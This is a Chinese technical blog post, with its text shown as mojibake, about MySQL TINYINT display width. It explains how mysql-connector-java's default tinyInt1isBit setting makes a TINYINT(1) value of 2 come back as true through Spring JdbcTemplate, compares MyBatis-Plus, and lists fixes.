            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        MySQLæ´æ°ç±»ååé¢çnæ¯æ¾ç¤ºå®½åº¦ï¼è¡¨ç¤ºæ¾ç¤ºæ¶æå°å nä¸ªå­ç¬¦å®½åº¦ï¼æ¢ä¸ä¼éå¶åå­å¨çæ°å¼èå´ï¼ä¹ä¸ä¼æªæ­æ¯åæ¾ç¤ºå®½åº¦æ´å®½çå¼ï¼ä¸ä½¿ç¨TINYINT(1)ï¼ç´æ¥ä½¿ç¨TINYINT(4)æTINYINT
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="å¼å¿ä¸å»">å¼å¿ä¸å»</h2>
<p>å¤§å­¦æé´ï¼è·åæè°äºä¸æ®µå»éª¨é­å¿çææï¼å ä¸ºæäºåå ï¼å¤§å­¦æ¯ä¸ååæäºã<br>
å¦ä»å¤§å­¦æ¯ä¸å·²ç»10å¹´ï¼å¬è¯´å¥¹å¾æ©å°±åºå½äºï¼èæï¼å¾æ©å°±æçå¥äºã<br>
æ¨å¤©ï¼åæåä¸äºæççè½¦ï¼æä¸ç¼å°±è®¤åºäºå¥¹ï¼å¥¹äº¦å¦å½åæ¨¡æ ·ï¼èæå´æ»¡è¸æ²§æ¡ã<br>
æä¸æ¢ææå¼ï¼é»é»çå¬çå¥¹æçµè¯ï¼è®²è¿°çå½å¤çç§ç§ã<br>
å¿«å°ç®çå°çæ¶åï¼å¥¹æ¾ä¸äºçµè¯è¯´ï¼æå·²ç»ææè¿10å¹´çç»åé½è¯´ç»ä½ å¬äºï¼ä½ è¿å¥ä½ å¥½é½ä¸è¯´å<br>
æç¥éçµè¯é£å¤´æ²¡æä»»ä½äººï¼å¥¹æ¯ææè¯´ç»æå¬çï¼æå½å½çé¢¤æçè¯´å°ï¼ä½ å¥½<br>
å¥¹æ·±æçççæï¼é®éï¼æä»¬è¿åå¾å»å<br>
æçæçæåå¥¹ï¼è¯´å°ï¼åå»ï¼åå»å¯ä»¥åï¼ä½å¾å é±......</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230496-740629878.gif"></div>
<h2 id="tinyint">TINYINT</h2>
<p>å³äº <code>TINYINT</code>ï¼æç¸ä¿¡å¤§å®¶é½ç¥éå®ï¼æ¯æ°æ®åºçä¸ç§æ°æ®ç±»åï¼è¯´çè¯¦ç»ç¹ï¼å®æ¯æ°æ®åºçä¸ç§æ°å­ç±»åï¼åè¯¦ç»ç¹ï¼å®æ¯æ°æ®åºçä¸ç§æ´æ°ç±»åï¼éè¦æ³¨æçæ¯ï¼å®å¹¶é SQL æ åæ´æ°ç±»å</p>
<blockquote>
<p>SQLæ åæ´æ°ç±»åï¼INTEGER<code>(or</code>INT<code>) and </code>SMALLINT</p>
</blockquote>
<p>èæ¯æäºæ°æ®åºçæå±æ´æ°ç±»åï¼æä»¥å¹¶éææçå³ç³»åæ°æ®åºé½æ¯æ TINYINTï¼æ¯æçæ°æ®åºç±»ååæ¬ <code>MySQL</code>ã<code>MariaDB</code>ã<code>SQL Server</code>ï¼æä»¬åºäº <code>MySQL</code> æ¥çç TINYINT</p>
<p>MySQL å®æ¹å¯¹<a href="https://dev.mysql.com/doc/refman/8.0/en/integer-types.html" target="_blank" rel="noopener nofollow">æ´æ°ç±»å</a>æå¦ä¸ä»ç»</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230116-563676929.png" alt="æ´æ°ç±»å"></div>
<p>é¤äº <code>TINYINT</code>ï¼MySQL è¿æå±åºäº <code>MEDIUMINT</code> å <code>BIGINT</code>ï¼è¿äºé½ä¸æ¯ SQL æ åæ´æ°ç±»åï¼å¨åä¸ååºæ°æ®è¿ç§»çæ¶åéè¦èèè¿äºç¹</p>
<blockquote>
<p>æ å SQLï¼ä¾¿äºè¿ç§»ï¼åè¡¨è®¾è®¡çæ¶åï¼å°½éç¨ SQL æ åæ°æ®ç±»å</p>
</blockquote>
<p>TINYINT å­å¨ç©ºé´å  <strong>1</strong> å­èï¼æç¬¦å·çå¼èå´æ¯ -128 å° 127ï¼æ ç¬¦å·çå¼èå´æ¯ 0 å° 255</p>
<p>TINYINT çåºæ¬ä»ç»å·²ç»å®æï¼ä¸é¢å¼å§å®æç¯èï¼å¼å§ä¹åæåé®ä½ ä»¬ä¸ä¸ªé®é¢</p>
<blockquote>
<p>å¨å®éé¡¹ç®ä¸­ï¼ä½ ä»¬ä¸è¬ç¨ TINYINT å­ä»ä¹ ï¼</p>
</blockquote>
<p>æ¯ä¸æ¯ç¨æ¥å­æä¸¾å¼ï¼ä¾å¦è¿æ ·</p>
<pre><code class="language-sql">`exec_status` TINYINT DEFAULT 0 COMMENT 'æ§è¡-ç¶æï¼0ï¼ç­å¾ä¸­ï¼1ï¼æ§è¡ä¸­ï¼2ï¼æåï¼3ï¼å¤±è´¥ï¼4ï¼ç»æ­¢'
</code></pre>
<p>çè³å¨æä¸¾å¼å°çæ¶åï¼ä¼ä½¿ç¨ <code>TINYINT(1)</code>ï¼å¯¹ä¸å¯¹ï¼éç¹æ¥äº</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229648-1266766793.jpg" alt="640 (8)"></div>
<p>TINYINT(1) ä¸­ç <code>1</code> è¡¨ç¤ºä»ä¹ï¼å¾å¤å°ä¼ä¼´ä¼çæå½ç¶çåç­éï¼<strong>æ°å¼èå´</strong>ï¼TINYINT(1) è¡¨ç¤ºçæ¯æ°å¼èå´æ¯ -9 å° 9ï¼æè 0 ~ 9</p>
<p>å¯¹ä¸å¯¹å¢ï¼æä»¬éªè¯ä¸å°±ç¥éäºãåºäº MySQL 8.0.31ï¼æä»¬åå»ºè¡¨</p>
<pre><code class="language-sql">CREATE TABLE `tbl_qsl_job` (
  `id` int NOT NULL COMMENT 'ä¸»é®',
  `exec_status` tinyint(1) DEFAULT 0 COMMENT 'æ§è¡-ç¶æï¼0ï¼ç­å¾ä¸­ï¼1ï¼æ§è¡ä¸­ï¼2ï¼æåï¼3ï¼å¤±è´¥ï¼4ï¼ç»æ­¢',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB;
</code></pre>
<p>æå¥ä¸æ¡è®°å½</p>
<pre><code class="language-sql">INSERT INTO tbl_qsl_job(id, exec_status) VALUES(1, 12);
</code></pre>
<p>ç»æä¼æä¹æ ·ï¼è¶åºèå´æ¥éï¼</p>
<p>å®éæ¯æå¥æå</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229673-110950449.png" alt="tinyint1_æå¥12æå"></div>
<p>éå¿æ¯ä¸æ¯ç¢äºä¸å°ï¼</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229763-87845519.png" alt="ææ¡å­"></div>
<p>ç»ä½ ä»¬ 10 ç§éï¼æ¶æ¾ä¸ç ´ç¢çéå¿ï¼æ¶æ¾å¥½äºä¹åæä»¬ä¸èµ·ççå®æ¹è¯´æï¼<a href="https://dev.mysql.com/doc/refman/5.7/en/numeric-type-attributes.html" target="_blank" rel="noopener nofollow">Numeric Type Attributes</a></p>
<blockquote>
<p>MySQL supports an extension for optionally specifying the display width of integer data types in parentheses following the base keyword for the type. For example, <a href="https://dev.mysql.com/doc/refman/5.7/en/integer-types.html" target="_blank" rel="noopener nofollow"><code>INT(4)</code></a> specifies an <a href="https://dev.mysql.com/doc/refman/5.7/en/integer-types.html" target="_blank" rel="noopener nofollow"><code>INT</code></a> with a display width of four digits. This optional display width may be used by applications to display integer values having a width less than the width specified for the column by left-padding them with spaces. (That is, this width is present in the metadata returned with result sets. Whether it is used is up to the application.)</p>
<p>The display width does <em>not</em> constrain the range of values that can be stored in the column. Nor does it prevent values wider than the column display width from being displayed correctly. For example, a column specified as <a href="https://dev.mysql.com/doc/refman/5.7/en/integer-types.html" target="_blank" rel="noopener nofollow"><code>SMALLINT(3)</code></a> has the usual <a href="https://dev.mysql.com/doc/refman/5.7/en/integer-types.html" target="_blank" rel="noopener nofollow"><code>SMALLINT</code></a> range of <code>-32768</code> to <code>32767</code>, and values outside the range permitted by three digits are displayed in full using more than three digits.</p>
</blockquote>
<p>ç¸ä¿¡ä½ ä»¬é½è½çæï¼INT(n) ä¸­ç n è¡¨ç¤ºçæ¯æ¾ç¤ºå®½åº¦ï¼INT(4) è¡¨ç¤ºçæ¯æ¾ç¤ºå®½åº¦ä¸ºåä½æ°ç INTãåºç¨ç¨åºå¯ä»¥éç¨å·¦å¡«åç©ºæ ¼çæ¹å¼æ¥å¡«åå®½åº¦ä¸å¤åæå®å®½åº¦çæ´æ°å¼ï¼ä¹å°±æ¯è¯´ï¼æ­¤å®½åº¦ä¼ä½ä¸ºç»æéçåæ°æ®è¿åï¼æ¯å¦ä½¿ç¨åå³äºåºç¨ç¨åºï¼</p>
<p>æ¾ç¤ºå®½åº¦ä¸ä¼éå¶åå­å¨çæ°å¼èå´ï¼ä¹ä¸ä¼æªæ­æ¯åæ¾ç¤ºå®½åº¦æ´å®½çå¼ãä¾å¦ï¼SMALLINT(3) ç±»åçåçå­æ°èå´ä¸ SMALLINT ä¸æ ·ï¼ä¹æ¯ 32768 å° 32767ï¼è¶åºä¸ä½æ°çå¼ä¼å®æ´æ¾ç¤º</p>
<p>å³äºæ´æ°ç±»åæ¾ç¤ºå®½åº¦ï¼æä»¬å¯ä»¥è¿è¡å¦ä¸æ»ç»</p>
<blockquote>
<p>ç±»ååé¢ç nï¼æ¯æ¾ç¤ºå®½åº¦ï¼è¡¨ç¤ºæ¾ç¤ºæ¶æå°å  n ä¸ªå­ç¬¦å®½åº¦ï¼æ¢ä¸ä¼éå¶åå­å¨çæ°å¼èå´ï¼ä¹ä¸ä¼æªæ­æ¯åæ¾ç¤ºå®½åº¦æ´å®½çå¼ï¼</p>
<p>æ¾ç¤ºå®½åº¦ä¼ä½ä¸ºç»æéçåæ°æ®è¿åï¼æ¯å¦ä½¿ç¨åå³äºåºç¨ç¨åºï¼è¿ä¸ªä¼ç¬ï¼åé¢ä¼å¼åºï¼å¼å¾æä»¬çæï¼</p>
</blockquote>
<h2 id="2-å-true">2 å true</h2>
<p>æä»¬æ tbl_qsl_job ä¸­ id = 1 çè®°å½çç¶ææ¹æ 2ï¼å ä¸ºæ²¡ææä¸¾å¼ 12ï¼</p>
<pre><code class="language-sql">UPDATE tbl_qsl_job SET exec_status = 2 WHERE id = 1;
</code></pre>
<p>åºäº <code>SpringBoot 2.7.18</code>ã<code>spring-jdbc 5.3.31 </code>ã<code>HikariCP 4.0.3</code>ã<code>mysql-connector-java 8.0.25 </code> æå»ºæ¥è¯¢</p>
<pre><code class="language-java">package com.qsl;

import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.support.rowset.SqlRowSet;
import org.springframework.jdbc.support.rowset.SqlRowSetMetaData;

import javax.annotation.Resource;

/**
 * @author youzb
 */
@SpringBootTest(classes = Application.class)
public class QslJobTest {

    @Resource
    private JdbcTemplate jdbcTemplate;

    @Test
    public void getByJdbcTemplate() {
        SqlRowSet sqlRowSet = jdbcTemplate.queryForRowSet("SELECT * FROM tbl_qsl_job WHERE id = 1");
        SqlRowSetMetaData metaData = sqlRowSet.getMetaData();
        while (sqlRowSet.next()) {
            for (int i = 1; i &lt;= metaData.getColumnCount(); i++) {
                System.out.print(sqlRowSet.getObject(i) + " ");
            }
            System.out.println();
        }
    }
}
</code></pre>
<p>ä½ ä»¬è§å¾æ§è¡ç»ææ¯ææ ·çï¼æ¯ä¸æ¯ <code>1 2</code> å¢</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230065-2086643304.png" alt="2åtrue"></div>
<p>å¯ä»¥çå°ï¼ç»æå¹¶ä¸æ¯ <code>1 2</code>ï¼èæ¯ <code>1 true</code>ï¼æ¯ä¸æ¯æç¹æµï¼</p>
<blockquote>
<p>æææ°æ®å­çæ¯ 2ï¼ä¸ºä»ä¹æ¥åºæ¥ç»ææ¯ trueï¼</p>
</blockquote>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230105-1018176054.png" alt="æµ" width="200px"></div>
<p>é¦åæä»¬å¯ä»¥ç¡®å®çæ¯ï¼æ°æ®åºå­å¨çå¼æ¯æ²¡é®é¢çï¼å ä¸ºéè¿ <code>navicat</code> æ¥å°çç»ææ¯ 2ï¼ä¹è¯´æ navicat æ²¡æå¯¹è¿ä¸ªå¼åç¹æ®è½¬æ¢ï¼</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230148-777704073.png" alt="æ°æ®åºä¸­å¼æ¯2"></div>
<p>åå°æä»¬çç¨åºï¼æ°æ®åºä¸­ç 2 å°ç¨åºæ§å¶å°ç trueï¼ç»è¿äºé£äºç¯èï¼æä»¬æ¯ä¸æ¯è½æ´çåºæ¥ï¼</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229966-212214453.png" alt="æ°æ®æµè½¬"></div>
<p>æ°æ®åºæä»¬å·²ç»ç¡®å®æ²¡é®é¢äºï¼è³äºæ¯ <code>mysql-connector-java 8.0.25</code>ã<code>HikariCP 4.0.3</code>ã<code>spring-jdbc 5.3.31</code> è°åäºç¹æ®å¤çï¼éè¦æä»¬è¿ä¸æ­¥ææ¥äºï¼æç´æ¥çæ¹å¼å°±æ¯ <code>Debug</code> åï¼æ­ç¹æå·²ç»æ¿ä½ ä»¬æå¥½</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230148-1870125991.png" alt="æ­ç¹debug"></div>
<p>æ­¤æ¶å°äº MySQL JDBC é©±å¨éé¢ï¼æä»¬æ¥çä¸ä¸ <code>this.results</code> çä¿¡æ¯ï¼æå ä¸ªç¹å¼å¾æä»¬éç¹å³æ³¨ä¸</p>
<ol>
<li>
<p>è¿æ¥åä¿¡æ¯</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229967-754344306.png" alt="è¿æ¥åä¿¡æ¯"></div>
<p>æä»¬éç½®çè¿æ¥ url æ¯</p>
<pre><code class="language-yaml">spring:
  datasource:
    url: jdbc:mysql://localhost:3306/fnj_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC
</code></pre>
<p>å¹¶æªè®¾ç½® <code>tinyint1isBit</code> å¼ï¼æä»¥å¶å¼ true æ¯ <code>mysql-connector-java 8.0.25</code> ç»çé»è®¤å¼</p>
</li>
<li>
<p>ååä¿¡æ¯</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230080-823708694.png" alt="ååä¿¡æ¯"></div>
<p>å¯ä»¥çå°ï¼å­æ®µ exec_status ç length = 1ï¼è¿ä¸ª length è¡¨ç¤ºä»ä¹å¢ï¼å ä¸ºå exec_status çç±»åæ¯æ´æ°ç±»åï¼æä»¥è¿ä¸ª length æ¯ä¸æ¯å°±æ¯ <code>æ¾ç¤ºå®½åº¦</code> ï¼ä¸ç¶è¿è½ä»£è¡¨ä»ä¹ï¼</p>
<p>æéè¦çæ¥äºï¼<code>mysqlType</code> ç <code>name</code> æ¯ <code>BIT</code></p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229818-885124704.png" alt="mysqltype_bit"></div>
<p>ä¹å°±æ¯è¯´ï¼mysql-connector-java 8.0.25 æ TINYINT(1) è§£ææäº MysqlType.BITï¼å¯¹åºç JAVA ç±»åå°±æ¯ <code>Boolean</code></p>
</li>
</ol>
<p>æ¢ç¶ exec_status ç JAVA ç±»åè¢«è§£ææäº Booleanï¼å¶å¼ 2 ä¹å°±è¢«è§£ææ true äºï¼æä»¥æ é¢çç­æ¡æ¯ä¸æ¯å°±æ¸æ¥äº</p>
<blockquote>
<p>mysql-connector-java 8.0.25 é»è®¤æåµä¸ï¼æ TINYINT(1) è§£ææ JAVA ç Boolean</p>
</blockquote>
<p>é®é¢åæ¥äºï¼mysql-connector-java 8.0.25 å¯¹ TINYINT çè§£æé»è¾æ¯ææ ·çå¢ï¼æä»¬è·ä¸æºç å°±ç¥éäº</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230115-2024493590.png" alt="mysqlTypeèµå¼é»è¾"></div>
<p>æä»¬åå®ä½å° <code>com.mysql.cj.protocol.a.ColumnDefinitionReader</code> ç 180 è¡ï¼ç¶åå¾ä¸æ¾å° <code>mysqlType</code> èµå¼çå°æ¹ï¼ColumnDefinitionReade 134 è¡ï¼</p>
<pre><code class="language-java">MysqlType mysqlType = NativeProtocol.findMysqlType(this.protocol.getPropertySet(), colType, colFlag, colLength, tableName, originalTableName,
                collationIndex, encoding);
</code></pre>
<p>è·è¿ NativeProtocol.findMysqlTypeï¼æä»¬è½çå°è¿æ ·ä¸æ®µä»£ç </p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229886-1256879629.png" alt="tinyintèµå¼é»è¾"></div>
<p>ç¬¬ä¸ä¸ª ifï¼æä»¬åå é¨åè§£æä¸</p>
<ol>
<li>
<p>isUnsigned</p>
<p>è¡¨ç¤ºæ¯å¦æ ç¬¦å·ï¼å»ºè¡¨çæ¶åï¼exec_status å¹¶æªæç¡®æå® <code>UNSIGNED</code>ï¼æä»¥æ¯æç¬¦å·çï¼é£ä¹ isUnsigned å¼æ¯ falseï¼åååæ¯ true</p>
</li>
<li>
<p>length</p>
<p>è¡¨å­æ®µçæ¾ç¤ºå®½åº¦ï¼ä¹å°±æ¯ TINYINT(1) ä¸­ç 1ï¼æä»¥ length == 1 çç»ææ¯ true</p>
</li>
<li>
<p>tinyInt1isBit</p>
<p>mysql-connector-java 8.0.25 ç <code>PropertyDefinitions</code> ä¼éæåå§åå¾å¤å±æ§é»è®¤å¼ï¼å¶ä¸­å°±åæ¬ tinyInt1isBit</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230030-1104270104.png" alt="tinyInt1isBité»è®¤å¼"></div>
<p>tinyInt1isBit çé»è®¤å¼æ¯ true</p>
<p>å¦ææä»¬å¨æ°æ®åºè¿æ¥ url ä¸­å¢å  <code>tinyInt1isBit=false</code></p>
<pre><code class="language-yaml">spring:
  datasource:
    url: jdbc:mysql://localhost:3306/fnj_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC&amp;tinyInt1isBit=false
</code></pre>
<p>é£ä¹éç½®å¼ä¼è¦çé»è®¤å¼</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230276-1204340058.png" alt="tinyInt1isBitå¼è¦ç"></div>
<pre><code class="language-java">setValueInternal(extractedValue, exceptionInterceptor);
this.initialValue = this.value;
</code></pre>
<p>è¿ä¸¤è¡ä¼åå«å° <code>value</code> å <code>initialValue</code> è®¾ç½®æ <code>false</code></p>
<p>åå° url æªéç½® tinyInt1isBit çæåµï¼tinyInt1isBit çå¼æ¯é»è®¤å¼ true</p>
</li>
<li>
<p>ååµ if ç transformedBitIsBoolean</p>
<p>å¨åæ tinyInt1isBit é»è®¤å¼çæ¶åï¼ä¹çº¢æ¡æ¡ä½è¿ transformedBitIsBoolean çé»è®¤å¼ï¼æ¯ falseï¼æ²¡æ³¨æçå°ä¼ä¼´ï¼å¯ä»¥å¾ä¸ç¿»ä¸ç¿»</p>
</li>
</ol>
<p>æä»¥ NativeProtocol.findMysqlType çè¿åå¼æ¯ <code>MysqlType.BIT</code>ãå¦æ length &gt; 1ï¼é£ä¹è¿åçåæ¯ <code>MysqlType.TINYINT_UNSIGNED</code> æ <code>MysqlType.TINYINT</code></p>
<p>èªæ­¤ï¼æ¥é¾å»èæ¯ä¸æ¯æ¸æ¥å¢ï¼</p>
<h2 id="é®é¢å¤ç">é®é¢å¤ç</h2>
<p>æ¢ç¶å·²ç»æ¾å°é®é¢åå ï¼é£ä¹å¤çæ¹å¼ä¹å°±æ¸æ°äºï¼æå¦ä¸å ç§</p>
<ol>
<li>
<p>url ä¸­éç½® tinyInt1isBit=false</p>
<p>è¿ä¸ªä¼å¨å±çæï¼æäºéè¦å° TINYINT(1) æ å°æ Boolean çæåµï¼ä¼åºé®é¢</p>
<p>èé¡¹ç®ä¸æ¨èå¢å è¯¥éç½®ï¼é¤éç¡®å®æ´ä¸ªé¡¹ç®ä¸­æ²¡æ TINYINT(1) æ å°æ Boolean çæåµ</p>
<p>æ°é¡¹ç®çè¯ï¼å¯ä»¥å¢å è¯¥éç½®</p>
</li>
<li>
<p>å­æ®µç±»åè°æ´ææ ç¬¦å·</p>
<p>å¢å  <code>UNSIGNED</code> ä¿®é¥°ï¼ä¾å¦</p>
<pre><code class="language-sql">`exec_status` tinyint(1) unsigned DEFAULT 0 COMMENT 'æ§è¡-ç¶æï¼0ï¼ç­å¾ä¸­ï¼1ï¼æ§è¡ä¸­ï¼2ï¼æåï¼3ï¼å¤±è´¥ï¼4ï¼ç»æ­¢',
</code></pre>
<p>ä½æä¸ªåæï¼æä¸¾å¼ä¸è½åºç°è´æ°</p>
</li>
<li>
<p>è°å¤§å­æ®µç±»åæ¾ç¤ºå®½åº¦</p>
<p>ç´æ¥ä½¿ç¨ TINYINT(4) æ TINYINT</p>
</li>
</ol>
<h2 id="ä¸¾ä¸åä¸">ä¸¾ä¸åä¸</h2>
<p>æ¢ç¶æ¯ mysql-connector-java 8.0.25 åäºé»è®¤å¼çå¤çï¼é£ä¹ MyBatis-Plus æ¥çç»ææ¯ä¸æ¯ä¹æ¯å° 2 å¤çæ true å¢ï¼æä»¬è¯ä¸ä¸å°±ç¥éäºï¼å¼å¥ MyBatis-Plus 3.5.7ï¼æµè¯ä»£ç å¾ç®å</p>
<pre><code class="language-java">@TableName("tbl_qsl_job")
public class QslJob {

    private Integer id;
    private Integer execStatus;

    public Integer getId() {
        return id;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    public Integer getExecStatus() {
        return execStatus;
    }

    public void setExecStatus(Integer execStatus) {
        this.execStatus = execStatus;
    }
}

	@Resource
    private QslJobDao qslJobDao;
    
    @Test
    public void testMybatisPlus() {
        QslJob qslJob = qslJobDao.selectById(1);
        System.out.println(qslJob.getId() + " " + qslJob.getExecStatus());
    }
</code></pre>
<p>ä½ ä»¬è§å¾æ§è¡ç»ææ¯ææ ·çï¼æ¥éï¼è¾åº 1 trueï¼è¿æ¯è¾åº 1 2ï¼æ§è¡ä¸å°±ç¥éäº</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229833-1537452094.png" alt="tinyint(1)_mybatis-plus"></div>
<p>æ¥è¯¢ç»ææ­£å¸¸ï¼</p>
<p>æåé¢çåæï¼mysql-connector-java 8.0.25 è¿å exec_status çå¼æ¯ trueï¼Boolean å¼ºè½¬ Integer ä¼æ¥éï¼å³ä½¿ä¸æ¥éï¼ç»æä¹åºè¯¥æ¯ 1ï¼0 = falseï¼1 = trueï¼åï¼æä¹ä¼æ¯ 2 å¢ï¼</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229819-259112532.jpg" alt="å¥½é¾ ä¸è¯¥å­¦ç¼ç¨ç"></div>
<p>Debug ä¸ä½ ä»¬å°±æç½äº</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230380-1646506667.png" alt="mybatis_getInt"></div>
<p>Mybatis éè¦å° mysql-connector-java 8.0.25 æ¥å°ç ResultSet æ å°æ QslJobï¼å°±éè¦ç¨å°ç±»åå¤çå¨ï¼QslJob å®ä½ç execStatus æ¯ Integer ç±»åçï¼é£è¯å®ç¨ IntegerTypeHandler è¿è¡å¤çåï¼èªç¶èç¶å°±ç¨å° <code>rs.getInt</code> ï¼æ¥å°çç»æèªç¶å°±æ¯ 2 äºã</p>
<p>æä»¬ååè¿å¤´å»ç <code>SqlRowSet</code>ï¼å¦ææä»¬ç¨ sqlRowSet.getInt æ¿æ¢ sqlRowSet.getObjectï¼æ¯ä¸æ¯å°±è¡äºï¼</p>
<pre><code class="language-java">@Test
public void getByJdbcTemplate() {
    SqlRowSet sqlRowSet = jdbcTemplate.queryForRowSet("SELECT * FROM tbl_qsl_job WHERE id = 1");
    SqlRowSetMetaData metaData = sqlRowSet.getMetaData();
    while (sqlRowSet.next()) {
        for (int i = 1; i &lt;= metaData.getColumnCount(); i++) {
            System.out.print(sqlRowSet.getInt(i) + " ");
        }
        System.out.println();
    }
}
</code></pre>
<p>è¿è¡ä¸ï¼æä»¬ä¼åç°æ¥éäº</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230281-1107795933.png" alt="getIntæ¥"></div>
<p>è¿åæ¯ä¸ºä»ä¹ï¼</p>
<p>åå å¨ JdbcTemplate çæ°æ®æå</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230041-1506294441.png" alt="extractData"></div>
<p>æä»¬å¯¹ rs è¿è¡ä¸ä¸ Evaluateï¼ç»æå¦ä¸</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229893-1587179875.png" alt="rs_evaluate"></div>
<p>æ­¤æ¶ rs.getInt è½æ­£å¸¸è·åå° 2ï¼è¿è¯´æä»ä¹ï¼</p>
<blockquote>
<p>mysql-connector-java 8.0.25 è½ç¶æ TINYINT(1) æ å°æäº JAVA ç Booleanï¼ä½å¶æ¥å°ç ResultSet ä¸­çæ°æ®ä»æ¯ä¸æ°æ®åºä¸­æ°æ®ä¸è´çåå§æ°æ®</p>
<p>HikariCP 4.0.3 ä¹å¹¶æªå¯¹åå§æ°æ®åè½¬æ¢å¤ç</p>
</blockquote>
<p>æä»¬ç»§ç»­è·è¿ rse.extractData(rs)ï¼è·è¿ä¸¤å±ä¼æ¥å°å³é®ç¹</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230333-1252826137.png" alt="cachedRowSet"></div>
<p>rowSet.populate(rs) ä¼æ ResultSet rs ä¸­çæ°æ®å¡«åå° CachedRowSetImpl ç <code>rvh</code> ä¸­</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230242-1871321000.png" alt="rhv"></div>
<p>æä»¬æ¥çè·è¿ sqlRowSet.getInt(i)ï¼ç­æ¡å³å°æ­æ</p>
<div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229879-213147928.png" alt="getInt_error"></div>
<p>çº¢æ¡æ¡ä½æ¯ä¸æ¯å°±ä¼æå¼å¸¸äºï¼æä»¬ç»§ç»­è·è¿ this.getCurrentRowï¼ä¼çå°æä»¬ååè®²å°ç <code>rvh</code></p>
<pre><code class="language-java">protected BaseRow getCurrentRow() {
    return (BaseRow)(this.onInsertRow ? this.insertRow : (BaseRow)((BaseRow)this.rvh.get(this.cursorPos - 1)));
}
</code></pre>
<p>æ¯ä¸æ¯å°±å¼åºä¸äºï¼è¿éæä¸¤ä¸ªå¼åº</p>
<ol>
<li>
<p>æ¾ç¤ºå®½åº¦</p>
<p>åé¢å·²ç»è®²å°ï¼æ¾ç¤ºå®½åº¦ä¼ä½ä¸ºç»æéçåæ°æ®è¿åï¼æ¯å¦ä½¿ç¨åå³äºåºç¨ç¨åº</p>
<p>spring-jdbc ç SqlRowSetResultSetExtractor#createSqlRowSet æ¹æ³ç¨å°äº CachedRowSetImpl#populateï¼å¨è¿è¡æ°æ®å¡«åçè¿ç¨ä¸­ï¼ä¼è°ç¨</p>
 <div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229943-1349522055.png" alt="è°ç¨myqlé©±å¨çgetObject"></div>
<p>mysql-connector-java 8.0.25 ç ResultSetImpl#getObject(int) æ¹æ³</p>
 <div align="center"><img src="https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230095-1344646817.png" alt="BITå¤ç"></div>
<p>æ¯ä¸æ¯ç¸å½äºç¨å°äºæ¾ç¤ºå®½åº¦ï¼</p>
</li>
<li>
<p>rvh</p>
<p>CachedRowSetImpl#populate æ¹æ³ï¼å°æ°æ®å¡«åå°äº Vector<object> rvh ä¸­<p></p>
<p>èæä»¬åçä»£ç  sqlRowSet.getInt(i) æ¯ä»è¿ä¸ª rvh ä¸­è·åç</p>


<p>æä»¥ï¼å½æ ¹ç»åºæ¯ <strong>spring-jdbc å° ResultSet å¤çæ CachedRowSetImpl çæºå¶ï¼æä»¬æ²¡æéµå¾ªï¼æä¼åºç° 2 å true è¿ç§ææä¹å¤çç»æ</strong></p>
<p>SQL Server ç tinyint ä¼ä¸ä¼æç±»ä¼¼é®é¢å¢ï¼æå¯ä»¥è¯å®çåè¯ä½ ä»¬ï¼ç®åä¸ä¼æï¼å ä¸º SQL Server ç tinyint æ²¡ææ¾ç¤ºå®½åº¦ä¸è¯´ï¼å°±æ¯åºå®ç <code>tinyint</code>ï¼ä¸æ¯æ <code>tinyint(n)</code>ï¼è³äºæªæ¥æ¯å¦æ¯æï¼æªæ¥åè¯´å</p>
<h2 id="æ»ç»">æ»ç»</h2>
<ol>
<li>
<p>MySQL æ´æ°ç±»ååé¢ç n æ¯æ¾ç¤ºå®½åº¦ï¼è¡¨ç¤ºæ¾ç¤ºæ¶æå°å  n ä¸ªå­ç¬¦å®½åº¦ï¼æ¢ä¸ä¼éå¶åå­å¨çæ°å¼èå´ï¼ä¹ä¸ä¼æªæ­æ¯åæ¾ç¤ºå®½åº¦æ´å®½çå¼</p>
</li>
<li>
